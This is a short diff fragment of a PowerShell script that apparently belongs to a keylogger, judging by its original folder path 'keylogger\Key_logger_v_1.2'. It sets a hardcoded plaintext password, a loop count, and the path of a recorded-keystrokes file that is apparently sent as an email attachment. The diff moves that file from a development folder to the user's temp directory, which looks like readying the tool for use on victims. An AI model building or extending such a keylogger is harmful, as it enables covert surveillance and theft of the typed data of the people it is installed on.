@@ -8,7 +8,7 @@ $Password = "ckuz khie yocw gxjk"
 $iterations = 100
 
 # Set the full path to the attachment file
-$attachmentPath = "D:\keylogger\Key_logger_v_1.2\hosting_test\Record.txt"
+$attachmentPath = "$env:TEMP\record.txt"
 
 # Initialize the loop counter
 $i = 0
